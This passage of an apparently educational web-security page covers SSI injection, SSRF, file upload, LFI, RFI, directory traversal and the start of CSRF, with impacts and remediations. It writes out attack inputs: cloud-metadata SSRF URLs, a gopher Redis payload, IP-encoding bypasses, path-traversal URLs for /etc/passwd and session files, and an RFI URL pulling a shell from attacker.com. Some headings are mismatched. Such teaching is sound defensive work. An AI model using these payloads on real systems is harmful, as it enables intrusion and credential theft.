factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
</pre>
                    <b>2. Use Secure Parsers</b>
                    <p>Prefer modern libraries that are secure by default (e.g., defusedxml in Python).</p>
                    <b>3. Input Validation</b>
                    <p>Accept only expected XML structures.</p>
                    <p>Reject or sanitize untrusted XML input.</p>
                    <b>4. Least Privilege</b>
                    <p>Run applications with minimal file and network permissions.</p>
                    <b>5. Regular Security Testing</b>
                    <p>Include XXE checks in penetration tests and code reviews.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://www.indusface.com/blog/how-to-identify-and-mitigate-xxe-vulnerability/">https://www.indusface.com/blog/how-to-identify-and-mitigate-xxe-vulnerability/</a></p>
                <p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p>
                <p><a href="https://www.imperva.com/learn/application-security/xxe-xml-external-entity/">https://www.imperva.com/learn/application-security/xxe-xml-external-entity/</a></p>
            </div>

    <!-- Topic 13: SSI Injection -->
        <div id="ssi-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>13. Server-Side Includes (SSI)</h2>
                </div>
                
                <h3>üß© Server-Side Includes (SSI):</h3>
                <p>Server-Side Includes (SSI) are simple directives embedded in web pages (e.g. <!--#include ...-->, <!--#echo ...-->) that the web server evaluates before sending the page. SSI injection occurs when untrusted user input is allowed into content that the server will parse for SSI directives ‚Äî letting an attacker make the server evaluate attacker-controlled SSI. That can lead to information disclosure, file inclusion, or in extreme cases execution of server-side commands depending on server configuration.</p>
            <div class="example-box">
                    <h3>üéØ Examples ‚Äî safe, non-exploitative</h3>
                    <p>Vulnerable pattern (conceptual ‚Äî do not use in production):</p>
                    <img src="Images/SSI-1.png" width="100%" height="auto">
                    <p>Safer pattern (use allowlist + server-side rendering):</p>
                    <img src="Images/SSI-2.png" width="100%" height="auto">
                    <p>Or avoid server-side SSI processing entirely and render templates in your application language with proper escaping.</p>
                    <p>Disable SSI in Apache for a directory</p>
                    <img src="Images/SSI-3.png" width="100%" height="auto">
                    <p>Allow includes but disable exec (Apache)</p>
                    <img src="Images/SSI-4.png"width="100%" height="auto">
                    <p>Allowlist pattern (application pseudocode)</p>
                    <img src="Images/SSI-5.png" width="100%" height="auto">

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Information disclosure</b> ‚Äî attacker can cause inclusion of local files (config files, credentials, etc.).</p>
                    <p><b>Local file inclusion</b> ‚Äî sensitive files under the web server‚Äôs view may be exposed.</p>
                    <p><b>Remote content inclusion / defacement </b>‚Äî attacker causes the site to include content from other locations.</p>
                    <p><b>Command execution</b> ‚Äî if SSI supports execution (e.g., exec) and it‚Äôs enabled, attacker may run commands (very high severity).</p>
                    <p><b>Stored attacks</b> ‚Äî malicious SSI saved in a database or comment that gets processed later (affects other users).</p>
                    <p><b>Trust erosion / phishing</b> ‚Äî site serves attacker-controlled content to real users.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Attack scenarios</h3>
                    <b>1. Dynamic include path controlled by user</b>
                    <img src="Images/SSI-7.png" width="100%" height="auto">
                    <b>2. Stored SSI payload</b>
                    <p>User-submitted content (comments, profile fields) is saved and later served inside a page processed for SSI. The saved payload executes when other users request the page.</p>
                    <b>3. Abuse of exec functionality</b>
                    <p>If the server‚Äôs include module allows command execution and untrusted data ends up in those directives, an attacker may run system commands.</p>
                    <b>4. Cross-file contamination</b>
                    <p>An attacker causes inclusion of a crafted fragment (hosted somewhere they control), which then runs in the context of the victim site (defacement, credential theft).</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <b>1. Disable SSI unless required.</b>
                    <p>If you don‚Äôt need it, turn off server SSI processing (e.g., remove Options Includes or avoid registering .shtml).</p>
                    <b>2. If SSI is required, disable dangerous features.</b>
                    <p>Use an option that forbids command execution (for example, prefer IncludesNOEXEC in Apache over full Includes) so exec functionality is disabled.</p>
                    <b>3. Never place raw user input into SSI contexts.</b>
                    <p>Do not write user-supplied content into files that will be processed for SSI. Escape or neutralize SSI delimiters " <, ! , - , # " before writing untrusted content to files that might be processed.</p>
                    <b>4. Use allowlists for any include choices.</b>
                    <p>Map user choices to fixed file paths managed by you. Do not accept arbitrary file paths or URLs from users.</p>
                    <b>5. Least privilege and separation.</b>
                    <p>Ensure the web server account cannot read sensitive files; keep configs and secrets outside the document root.</p>
                    <b>6. Logging and monitoring.</b>
                    <p>Monitor for unusual include directives, requests for internal files, and logs showing SSI patterns where they shouldn‚Äôt be.</p>
                    <b>7. Patch & harden</b>
                    <p>Keep web server modules up to date and follow vendor hardening guides.</p>
                    <b>8. Output encoding / escaping for SSI context</b>
                    <img src="Images/SSI-6.png" width="100%" height="auto">
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection">https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection</a></p>
                <p><a href="https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/">https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/</a></p>
                <p><a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a></p>
            </div>
        </div>



    <!-- Topic 14: Server-Side Request Forgery (SSRF) -->
            <div id="server-side-request-forgery" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>14. Server-Side Request Forgery (SSRF)</h2>
                </div>
                
                <h3>üß© Server-Side Request Forgery (SSRF):</h3>
                <p>Server-Side Request Forgery (SSRF) occurs when a server-side application fetches a URL or network resource using attacker-controlled input, and the attacker manipulates that input so the server makes unintended requests ‚Äî often to internal systems that are not directly reachable from the outside. In short: the server becomes the attacker‚Äôs proxy./p>
                <div class="example-box">
                    <h3>Main types of SQL Injection (simple descriptions + what they let an attacker do)</h3>
                    <b>1. In-band SQLi (Classic)</b>
                    <p><b>Union-based:</b> attacker uses UNION to append attacker-controlled query results to the app‚Äôs results.</p>
                    <p><b>Error-based:</b> attacker forces database errors that reveal data.</p>
                    <p><b>When used:</b> when application returns query results or error messages directly.</p>
                    <b>2. Inferential (Blind) SQLi</b>
                    <p><b>Boolean-based (content-based) blind:</b> attacker sends queries that return different page content depending on a true/false condition; attacker infers data.</p>
                    <p><b>Time-based blind:</b> attacker forces a delay (e.g., SLEEP) to infer true/false from response time.</p>
                    <p><b>When used:</b> when the app does not return query output or errors.</p>
                    <b>3. Out-of-band (OOB) SQLi</b>
                    <p>Uses DB features to make outbound requests (DNS/HTTP) to attacker-controlled servers to exfiltrate data.</p>
                    <p><b>When used:</b> when direct or blind channels are blocked but outbound network from DB is allowed.</p>
                    <b>4. Second-order SQLi</b>
                    <p>Malicious input is stored safely at entry but later used unsafely (concatenated into SQL) in another operation; exploit happens later.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Server-side data disclosure</b> ‚Äî internal-only endpoints (APIs, admin consoles) can leak secrets.</p>
                    <p><b>Cloud credential theft</b> ‚Äî metadata services (e.g., AWS IMDS) may return temporary credentials.</p>
                    <p><b>Internal port scanning / network discovery</b> ‚Äî attacker can map internal network and services.</p>
                    <p><b>Remote command execution</b> ‚Äî protocol abuse (gopher/file) or vulnerable internal services can lead to RCE.</p>
                    <p><b>Lateral movement </b>‚Äî pivot into internal systems, databases, management interfaces.</p>
                    <p><b>Denial of service</b> ‚Äî force expensive requests or to internal services causing outage.</p>
                    <p><b>Bypass IP-based ACLs</b> ‚Äî access internal resources otherwise protected by network ACLs.</p>
                </div>
                <p>Severity depends on what the server can reach and what the internal services expose.</p>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Typical attack scenarios & concrete examples</h3>
                    <p>All payloads below are for defensive understanding only ‚Äî do not use them against targets you do not own or have permission to test.</p>
                    <b>1. Basic SSRF: fetch a URL provided by user</b>
                    <b>Vulnerable code (pseudo-PHP):</b>
<pre>
$url = $_GET['url'];
$body = file_get_contents($url);  // vulnerable: no validation
echo $body;
</pre>
                    <p><b>Attack:</b> ?url=http://internal-api.local/admin/config</p>
                    <p><b>What happens:</b> Server fetches /admin/config from internal network and returns it (sensitive configuration exposed).</p>
                    <p><b>Mitigation:</b> Allowlist hosts/domains, disallow private addresses, perform safe URL parsing and validation.</p>
                    <b>2. SSRF to cloud metadata (AWS example)</b>
                    <p><b>Payload: </b>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</p>
                    <p><b>What happens:</b> If the server is on EC2 and makes this request, it may retrieve IAM role names and then temporary credentials ‚Äî attacker can use them to access cloud resources.</p>
                    <p><b>Mitigation:</b> Network egress controls, require IMDSv2 (tokens), block metadata IP at host firewall for app processes, and follow cloud provider guidance.</p>
                    <b>3. Blind / OOB SSRF ‚Äî exfiltrate via DNS</b>
                    <p><b>Idea:</b> If the server can resolve external hostnames, attacker supplies a URL that causes a DNS lookup containing secret data.</p>
                    <p>Example flow:</p>
                    <p>1. Attacker uses ?url=http://internal-service/secret but response isn't returned.</p>
                    <p>2. The SSRF triggers a request to http://internal-service/‚Ä¶ that causes internal data to be included in a callback or DNS lookup to attacker-controlled-domain.</p>
                    <p>3. Attacker reads DNS requests at their name server and extracts the data.</p>
                    <p><b>Mitigation:</b> Egress filtering, block outbound DNS, prevent app from making arbitrary network requests.</p>
                    <b>4. Protocol abuse ‚Äî using gopher:// to talk to Redis or memcached</b>
                    <p><b>Background:</b> gopher:// URLs can embed raw protocol commands. Attackers have used SSRF to connect to Redis and write keys or even craft payloads that lead to remote code execution on some stacks.</p>
                    <b>Example (conceptual):</b>
<pre>
gopher://127.0.0.1:6379/_SET%20%22shell%22%20%22...%22
</pre>
                    <p><b>What happens:</b> Server issues raw Redis commands ‚Äî if Redis is misconfigured, this can be abused to write files or execute commands.</p>
                    <p><b>Mitigation:</b> Block non-HTTP schemes, restrict allowed schemes, prevent connections to internal ports.</p>
                    <b>5. Redirect chaining & IP encoding bypasses</b>
                    <p>Attackers bypass naive filters by encoding IPs or using different representations:</p>
                    <p>Decimal IP: http://2852039168 (decimal of 169.254.169.254)</p>
                    <p>IPv6 mapped: http://::ffff:127.0.0.1</p>
                    <p>URL-encoded characters or using redirects from an allowed domain to internal IPs.</p>
                    <p><b>Mitigation:</b> Normalize and resolve the final IP before allowing the request; perform DNS resolution server-side and check the resulting IPs against allow/deny lists.</p>
                    <b>6. Second-order SSRF: stored URL later fetched by privileged process</b>
                    <p><b>Flow:</b> Attacker stores a seemingly innocuous URL in a profile. Later, an admin feature fetches that URL with higher privileges ‚Äî the stored malicious URL triggers SSRF to internal services when processed by the admin flow.</p>
                    <p><b>Mitigation:</b> Treat stored inputs as untrusted; validate again on use; apply allowlists.</p>
                    <h3>How attackers find & abuse SSRF</h3>
                    <p>Fuzzing/automation: supplying various URLs, internal IPs, metadata endpoints, different protocols (file://, gopher://), and observing responses or side effects.</p>
                    <p>Looking for endpoints that accept URLs (image fetchers, PDF fetchers, webhooks, URL previewers).</p>
                    <p>Chaining SSRF with other vulnerabilities (open redirects, exposed internal services).</p>
                    <h3>Secure coding examples</h3>
<b>Node.js ‚Äî safe pattern (allowlist + IP check)</b>
<pre>
const url = require('url');
const dns = require('dns').promises;
const net = require('net');

const ALLOWED_HOSTNAMES = new Set(['api.example.com', 'images.example.com']);

async function safeFetch(inputUrl) {
  const parsed = new URL(inputUrl); // will throw on invalid URL
  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Bad scheme');

  if (ALLOWED_HOSTNAMES.has(parsed.hostname)) {
    // OK - directly allowed
    return fetch(parsed.toString(), { timeout: 5000 });
  }

  // Optionally resolve and verify IPs are not private:
  const addrs = await dns.lookup(parsed.hostname, { all: true });
  for (const a of addrs) {
    if (net.isIP(a.address)) {
      // check if a.address is in private range (implement ip-range checks)
      if (isPrivateIp(a.address)) throw new Error('Private IP not allowed');
    }
  }

  throw new Error('Host not allowed');
}
</pre>
<p>(Implement isPrivateIp() using a robust IP/net library.)</p>
<b>Python ‚Äî minimal safe pattern</b>
<pre>
    from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_HOSTS = {'api.example.com'}

def is_private_ip(ip):
    ip_obj = ipaddress.ip_address(ip)
    return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local

def safe_fetch(url):
    p = urlparse(url)
    if p.scheme not in ('http', 'https'):
        raise ValueError('Bad scheme')
    if p.hostname in ALLOWED_HOSTS:
        # allowed
        return requests.get(url, timeout=5)
    # resolve
    ips = socket.getaddrinfo(p.hostname, None)
    for family, _, _, _, sockaddr in ips:
        ip = sockaddr[0]
        if is_private_ip(ip):
            raise ValueError('Disallowed private IP')
    raise ValueError('Host not allowed')
</pre>
                p><b>Note:</b> DNS resolution must be done server-side (not trusting client-supplied DNS) and you must also check redirects ‚Äî re-resolve and re-check after each redirect.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation & defenses</h3>
                    <b>1. Avoid making requests to attacker-controlled URLs</b>
                    <p>Don‚Äôt fetch arbitrary URLs supplied by users. If not necessary, remove the feature.</p>
                    <b>2. Use a strict allowlist (preferred)</b>
                    <p>Maintain a list of permitted hostnames or domains. Only allow requests to validated, known-good destinations</p> 
                    <p>Avoid blacklists ‚Äî they‚Äôre easy to bypass</p>
                    <b>3. If allowlist impossible, perform robust validation</b>
                    <p>Parse the URL using a safe library (do not rely on regex).</p>
                    <p>Resolve DNS server-side and check the final IP(s) against an allowlist/denylist (reject private, link-local, loopback ranges).</p>
                    <p>Disallow unusual schemes ‚Äî only allow http and https if needed.</p>
                    <p>Follow redirects server-side and re-check the resolved host/IP after each redirect.</p>
                    <p><b>4. Block private/internal IP ranges</b> (if external-only fetches are expected)</p>
                    <p>Block RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, loopback 127.0.0.0/8, link-local 169.254.0.0/16, IPv6 equivalents, and cloud metadata ranges (e.g., 169.254.169.254).</p>
                    <b>5. Network-level protections</b>
                    <p>Egress filtering: allow app servers to only reach necessary endpoints.</p>
                    <p>Block outbound DNS where possible or force DNS resolution via trusted resolver with logging.</p>
                    <p>Use an outbound proxy that enforces allowlists and protocol validation.</p>
                    <b>6. Require authentication or tokens for sensitive services</b>
                    <p>For cloud metadata, enable provider mitigations (e.g., AWS IMDSv2 requires session tokens).</p>
                    <p>Harden internal admin services (mutual TLS, firewall rules).</p>
                    <b>7. Disallow/limit non-HTTP schemes</b>
                    <p>Refuse file://, gopher://, dict://, ftp:// and other schemes unless explicitly needed and validated.</p>
                    <b>8. Run requests with minimal privileges and safe timeouts</b>
                    <p>Use short timeouts, small response size limits, and run fetching code in a constrained environment with limited access.</p>
                    <b>9. Log & monitor</b>
                    <p>Log outgoing requests joined to the initiating user/session. Alert on requests to internal ranges or unusual targets.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></p>
                <p><a href="https://cwe.mitre.org/data/definitions/918.html">https://cwe.mitre.org/data/definitions/918.html</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/">https://cheatsheetseries.owasp.org/</a></p>
                <p><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html</a></p>
            </div>
        </div>
    
        <!-- Topic 15: File Upload Vulnerability -->
            <div id="file-upload" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>15. File Upload Vulnerability</h2>
                </div>
                
                <h3>üìå File Upload Vulnerability</h3>
                <p>A File Upload Vulnerability occurs when a web application lets users upload files without properly validating them. Attackers can exploit this to upload malicious scripts, malware, or executables, leading to server compromise, data theft, or full system takeover. The fix is to strictly validate file types, restrict upload locations, and never execute uploaded files.</p>
                <p>Many websites allow users to upload files (profile pictures, documents, videos, etc.).</p>
                <p>If the application doesn‚Äôt check file type, size, or content properly, attackers can upload harmful files.</p>
                <p>Example: Instead of a .jpg image, an attacker uploads a .php web shell that executes commands on the server.</p>

                <h3>‚úÖ How is File Validation Used?</h3>
                <p>File validation is the process of checking uploaded files to ensure they conform to expected criteria such as:</p>
                <p><b>File type validation:</b> Confirming the file extension and MIME type match allowed types (e.g., .jpg, .png, .pdf).</p>
                <p><b>File size validation:</b> Enforcing size limits to prevent resource exhaustion.</p>
                <p><b>File content validation:</b> Optionally inspecting file contents to detect malicious code.</p>
                <p><b>Filename sanitization:</b> Removing or restricting harmful characters to prevent path traversal or injection.</p>
                <p><b>Storage location control:</b> Ensuring uploaded files are stored in secure, non-executable directories.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of File Upload Vulnerabilities</h3>
                    <p><b>Remote Code Execution (RCE):</b> Attackers can upload and execute malicious scripts on the server.</p>
                    <p><b>Malware Distribution:</b> The system can become a source for spreading malware.</p>
                    <p><b>Denial of Service (DoS):</b> Uploading very large or numerous files can exhaust server resources.</p>
                    <p><b>Data Breach or Defacement:</b> Malicious files may lead to data leaks or unauthorized site modification.</p>
                    <p><b>Unauthorized Access:</b> Exploiting uploaded files to escalate privileges.</p>
                </div>

                <div class="attack-scenario-box">
                    <h3>üéØ Examples & Attack Scenarios</h3>
                    <b>1. Web Shell Upload</b>
                    <p>Attacker uploads shell.php disguised as image.jpg.php.</p>
                    <p>Visiting http://example.com/uploads/shell.php gives them remote control of the server.</p>
                    <b>2. Malware Distribution</b>
                    <p>Uploading a malicious .exe file that unsuspecting users download and run.</p>
                    <b>3. Bypassing Filters</b>
                    <p>Attackers rename malware.php to malware.php.jpg to bypass weak extension checks.</p>
                    <b>4. Path Traversal in Uploads</b>
                    <p>Uploading a file with ../../evil.php in its name to place it in a sensitive directory.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>1. Strictly validate file type and MIME type to accept only known safe formats.</p>
                    <p>2. Enforce file size limits to control resource use.</p>
                    <p>3. Sanitize file names or generate safe random names.</p>
                    <p>4. Store uploaded files outside the web root to prevent direct execution.</p>
                    <p>5. Scan uploaded files with antivirus/malware scanners if possible.</p>
                    <p>6. Implement authentication and authorization for upload endpoints.</p>
                    <p>7. Log upload activity to detect suspicious behavior.</p>
                </div>
                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</a></p>
            </div>

        <!-- Topic 16: Local File Inclusion (LFI) -->
            <div id="local-file-inclusion" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>16. Local File Inclusion (LFI)</h2>
                </div>
                
                <h3>üìå Local File Inclusion (LFI)</h3>
                <p>A Local File Inclusion (LFI) vulnerability happens when a web application allows user input to specify files that the server loads, without proper validation. Attackers can exploit this to read sensitive files, expose source code, or even achieve remote code execution. The fix is to sanitize user input, restrict file access, and use secure coding practices.</p>
                <p>Local File Inclusion (LFI) occurs when a web app dynamically includes files based on user input.</p>
                <p>If the input isn‚Äôt validated, attackers can trick the server into loading unexpected files from its local filesystem.</p>
                <p>Example vulnerable PHP code:</p>
                <img src="Images/LFI-1.png" width="750" height="140">
                <p>If a user requests ?page=../../etc/passwd, the server may expose sensitive system files.</p>

                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of LFI</h3>
                    <p><b>Sensitive File Disclosure:</b> Attackers can read files like /etc/passwd, configuration files, or logs.</p>
                    <p><b>Source Code Exposure:</b> Application code (e.g., config.php) may be revealed, leaking database credentials.</p>
                    <p><b>Authentication Bypass:</b> Session or cookie files could be included to hijack sessions.</p>
                    <p><b>Remote Code Execution (RCE):</b> When combined with file upload or log poisoning, attackers can execute arbitrary code.</p>
                    <p><b>Privilege Escalation:</b> If chained with other vulnerabilities, attackers may gain full server control.</p>
                </div>

                <div class="attack-scenario-box">
                    <h3>üéØ Examples & Attack Scenarios</h3>
                    <b>File Disclosure</b>
<pre>
http://example.com/index.php?page=../../../../etc/passwd
</pre>
                    <p>Reveals system user accounts.</p>
                    <b>Source Code Exposure</b>
<pre>
http://example.com/index.php?page=../../config.php
</pre>
                    <p>Exposes database credentials.</p>
                    <b>Log Poisoning to RCE</b>
                    <p>Attacker injects PHP code into server logs (e.g., via User-Agent header).</p>
                    <p>Then includes the log file via LFI to execute the code.</p>
                    <b>Session Hijacking</b>
<pre>
http://example.com/index.php?page=../../../../tmp/sess_abcd1234
</pre>
                    <p>Reads session files to impersonate users.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <b>1. Input Validation & Whitelisting</b>
                    <p>Only allow predefined, safe file names.</p>
                    <p>Never trust user input for file paths.</p>
                    <b>2. Disable Dangerous Functions</b>
                    <p>In PHP, disable include, require, or allow_url_include where not needed.</p>
                    <b>3. Use Path Restrictions</b>
                    <p>Implement a chroot jail or restrict file access to specific directories.</p>
                    <b>4. Error Handling</b>
                    <p>Don‚Äôt reveal detailed error messages that expose file paths.</p>
                    <b>5. Least Privilege</b>
                    <p>Run the web server with minimal permissions to limit damage.</p>
                </div>
                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/">https://brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/</a></p>
                <p><a href="https://www.valencynetworks.com/kb/local-file-inclusion-lfi-vulnerability-risks-impact-and-fixation.html">https://www.valencynetworks.com/kb/local-file-inclusion-lfi-vulnerability-risks-impact-and-fixation.html</a></p>
                <p><a href="https://techtalkpine.com/2025/03/lfi-demo/">https://techtalkpine.com/2025/03/lfi-demo/</a></p>
            </div>

        <!-- Topic 17: Remote File Inclusion (RFI) -->
            <div id="remote-file-inclusion" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>17. Remote File Inclusion (RFI)</h2>
                </div>
                
                <h3>üìå Remote File Inclusion (RFI)</h3>
                <p>A Remote File Inclusion (RFI) vulnerability happens when a web application loads files based on user input without proper validation, allowing attackers to include and execute malicious files from remote servers. This can lead to remote code execution, data theft, or full server compromise. The fix is to disable remote file inclusion, validate inputs, and restrict file access.</p>
                <p>It occurs when a web app dynamically includes files (e.g., PHP include() or require()) using user-supplied input.</p>
                <p>If input isn‚Äôt sanitized, attackers can point the application to a remote malicious file hosted on their server.</p>
                <p>Example vulnerable PHP code:</p>
                <img src="Images/RFI-1.png" width="750" height="250">
                <p>The malicious script from evil.com will run on the server.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of RFI</h3>
                    <p><b>Remote Code Execution (RCE):</b> Attackers can run arbitrary code on the server.</p>
                    <p><b>Server Takeover:</b> Full control of the web server if it runs with high privileges.</p>
                    <p><b>Website Defacement:</b> Injecting malicious content into web pages.</p>
                    <p><b>Data Theft:</b> Access to sensitive files, databases, or credentials.</p>
                    <p><b>Pivoting:</b>Using the compromised server to attack internal networks.</p>
                </div>

                <div class="attack-scenario-box">
                    <h3>üéØ Attack Scenarios</h3>
                    <b>1. Remote Shell Upload</b>
                    <p>Attacker hosts a malicious PHP file (shell.php) on their server.</p>
                    <p>Victim site includes it via:</p>
<pre>
http://victim.com/index.php?page=http://attacker.com/shell.php
</pre>
                    <p>Now the attacker can execute commands remotely.</p>
                    <b>2. Malware Injection</b>
                    <p>RFI is used to load a remote script that steals cookies or injects malware into pages.</p>
                    <b>3. Botnet Recruitment</b>
                    <p>Compromised servers can be forced to download and run scripts that make them part of a botnet.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation</h3>
                    <b>1. Disable Remote File Inclusion</b>
                    <p>In PHP, set allow_url_include=Off and allow_url_fopen=Off.</p>
                    <b>2. Input Validation & Whitelisting</b>
                    <p>Only allow predefined, safe file names.</p>
                    <p>Never let users directly control file paths.</p>
                    <b>3. Use Secure Coding Practices</b>
                    <p>Replace dynamic includes with static mappings.</p>
                    <p>Avoid using include() or require() with user input.</p>
                    <b>4. Least Privilege</b>
                    <p>Run the web server with minimal permissions.</p>
                    <b>5. Error Handling</b>
                    <p>Hide detailed error messages that may reveal file paths.</p>
                </div>
                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/">https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/</a></p>
                <p><a href="https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring">https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring</a></p>
                <p><a href="https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks">https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks</a></p>
            </div>

        <!-- Topic 18: Directory Traversal -->
            <div id="directory-traversal" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>18. Directory Traversal</h2>
                </div>
                
                <h3>üìå Remote File Inclusion (RFI)</h3>
                <p>Directory traversal occurs when attackers exploit insecure file path handling in web applications.</p>
                <p>By inserting sequences like ../ (dot-dot-slash), attackers can ‚Äúclimb‚Äù out of the web root directory and access restricted files.</p>
                <b>Example Input:</b>
<pre>
http://example.com/getFile?name=../../etc/passwd
</pre>
                <p>This could trick the server into returning the system‚Äôs password file.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of the Issue</h3>
                    <p><b>Data Exposure:</b> Attackers can read sensitive files (e.g., /etc/passwd, application source code, API keys).</p>
                    <p><b>System Compromise:</b> If write permissions exist, attackers may overwrite files or inject malicious code.</p>
                    <p><b>Application Manipulation:</b> Access to configuration files may allow bypassing authentication or escalating privileges.</p>
                    <p><b>Regulatory Risk:</b> Breaches of personal data can lead to compliance violations (GDPR, HIPAA, etc.).</p>
                </div>

                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>Sensitive File Disclosure:</b> An attacker retrieves /etc/passwd on a Linux server to enumerate users.</p>
                    <p><b>Application Source Code Theft:</b> Accessing ../../app/config.php to steal database credentials.</p>
                    <p><b>Log File Manipulation:</b> Overwriting log files to hide malicious activity.</p>
                    <p><b>Real-World Example:</b> Directory traversal was used in attacks against older versions of Apache Tomcat and PHP applications, where improper input sanitization exposed system files.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation</h3>
                    <p><b>Input Validation:</b> Sanitize and validate all user-supplied file paths.</p>
                    <p><b>Use Whitelisting:</b> Allow access only to explicitly permitted files/directories.</p>
                    <p><b>Avoid Direct File Access:</b> Map user requests to internal identifiers instead of raw file paths.</p>
                    <p><b>Least Privilege:</b> Run applications with minimal OS permissions to limit damage.</p>
                    <p><b>Web Application Firewall (WAF):</b> Detect and block suspicious path traversal attempts.</p>
                    <p><b>Regular Security Testing:</b> Conduct penetration tests and code reviews to catch vulnerabilities.</p>
                </div>
                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://brightsec.com/blog/directory-traversal-attack/">https://brightsec.com/blog/directory-traversal-attack/</a></p>
                <p><a href="https://www.intigriti.com/researchers/hackademy/directory-traversal">https://www.intigriti.com/researchers/hackademy/directory-traversal</a></p>
                <p><a href="https://www.imperva.com/learn/application-security/directory-traversal/">https://www.imperva.com/learn/application-security/directory-traversal/</a></p>
            </div>


           <!-- Topic 19: Cross-Site Request Forgery -->
            <div id="cross-site-request-forgery" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>19. Cross-Site Request Forgery</h2>
                </div>
                
                <h3>üß© Cross-Site Request Forgery:</h3>
                <p>CSRF (Cross-Site Request Forgery) is an attack where a malicious website tricks a user‚Äôs browser into making unintended requests to a web application where the user is already authenticated.</p>
                <p>The attacker does not steal credentials; instead, they exploit the user‚Äôs active session to perform actions on their behalf.</p>
                <p>CSRF relies on the fact that browsers automatically send cookies or authentication tokens with requests.</p>
                
                <div class="example-box">
                    <h3>Examples</h3>
                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Account takeover:</b> change password, email, or profile settings.</p>
                    <p><b>Financial loss:</b> initiate bank transfers or payments.</p>
                    <p><b>Data manipulation:</b> modify or delete sensitive data.</p>
                    <p><b>Privilege escalation: </b>perform admin actions if the victim is an admin.</p>
                </div>
                <p>Severity depends on what actions are available to the authenticated user.</p>
                
                <div class="attack-scenario-box">
                    <h3>‚ö†Ô∏è How CSRF Works (Attack Scenario)</h3>
                    <b>Scenario 1 ‚Äî Simple CSRF (GET request)</b>
                    <p>1. Victim is logged in to example.com.</p>
                    <p>2. Attacker hosts a page with:</p>
                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
